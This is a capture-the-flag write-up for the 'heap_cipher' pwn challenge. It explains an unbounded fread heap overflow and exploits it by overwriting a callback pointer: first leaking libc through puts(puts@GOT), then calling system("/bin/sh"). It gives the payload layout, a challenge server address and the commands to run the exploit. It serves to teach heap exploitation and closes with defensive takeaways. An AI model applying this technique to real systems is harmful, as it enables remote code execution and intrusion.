# Heap Cipher (maybe-hidden) — Write-up

**Category:** pwn (heap overflow → control-flow hijack)
**Binary:** `heap_cipher` — ELF 64-bit (x86-64), dynamically linked
**Support:** `libc.so.6` (GLIBC 2.41), `ld-linux-x86-64.so.2`, plus
`heap_cipher_local` (a locally-patched copy for testing)
**Remote:** `141.85.224.104:43337`

## The challenge

`run_session()` sets up a "CipherBox" using two heap chunks:

```c
data   = malloc(0x40);     // message buffer  (chunk A)
box    = malloc(0x20);     // control struct  (chunk B)

box->key          = 0xab;      // box+0x00
box->rounds       = 3;         // box+0x04
box->data_ptr     = data;      // box+0x08   -> chunk A
box->len          = 0;         // box+0x10
box->output_fn    = default_output;  // box+0x18  (called later)

scanf("%u", &len);             // attacker-chosen length
fread(data, 1, len, stdin);    // <-- reads `len` bytes into the 0x40 buffer

box->len = bytes_read;
cipherbox_encrypt(data, min(len, 0x40), box->key, box->rounds);
box->output_fn(box->data_ptr, box->len);   // indirect call through the struct
free(box); free(data);
```

## The bug — unbounded `fread` into a fixed buffer

`data` is a `malloc(0x40)` buffer, but `fread(data, 1, len, stdin)` copies the
**attacker-supplied `len`** bytes with no cap. Only the *encryption* clamps its
length to `0x40`; the copy itself does not. So any `len > 0x40` overflows chunk
A straight into the adjacent control struct (chunk B), which lives `0x50` bytes
after `data`.

Everything in `box` is now attacker-controlled, including:

* `box->data_ptr` at `+0x58` (relative to `data`) — becomes **arg1** of the call;
* `box->output_fn` at `+0x68` — the **function pointer** that gets called.

Right after the overflow the program executes:

```c
box->output_fn(box->data_ptr, box->len);
```

which is a fully controlled `func(arg1, arg2)` primitive — a textbook
overwrite-the-callback win.

## Exploitation — leak libc, then `system("/bin/sh")`

No PIE info is needed for the binary itself (its PLT/GOT are at fixed
non-PIE addresses: `puts@plt = 0x401040`, `puts@got = 0x404008`). Two rounds:

**Round 1 — leak.** Overflow so that `output_fn = puts@plt` and
`data_ptr = puts@GOT`. The program then calls `puts(puts@GOT)`, printing the
resolved libc address of `puts`. Subtract the known `libc.symbols['puts']`
offset to get the **libc base**.

The overflow layout (total `0x70` bytes) keeps chunk B's size field valid so the
later `free()` calls don't abort:

```
'A'*0x40            # message (first 0x40 get encrypted — irrelevant)
'B'*8               # chunk B prev_size padding
p64(0x31)           # chunk B size  (kept valid so free() survives)
p64(0)              # box key/rounds
p64(arg1)           # box->data_ptr  (+0x58)
p64(0)              # box->len       (clobbered by program anyway)
p64(func)           # box->output_fn (+0x68)
```

**Round 2 — shell.** Reconnect / loop again, this time with
`output_fn = system` and `data_ptr = &"/bin/sh"` (both computed from the leaked
libc base). The indirect call becomes `system("/bin/sh")`.

Because `libc base & 0xfff == 0` is asserted after the leak, a bad/misaligned
read is caught immediately rather than silently producing a wrong base.

## Run it

```bash
python3 exp_heap.py REMOTE      # -> 141.85.224.104:43337
python3 exp_heap.py             # local, against ./heap_cipher
```

On success it drops to an interactive shell and runs
`id; cat flag*; cat /flag*; ls -la`.

## Key takeaways

* A length used for the *copy* must be the same length that was *allocated* —
  clamping only the downstream consumer (the cipher) leaves the copy itself
  wide open.
* Adjacent heap objects + a controllable callback pointer = direct control-flow
  hijack; no ROP, no one-gadget needed.
* Keep overwritten chunk metadata *valid* so the program's own `free()` calls
  don't crash before your callback fires.
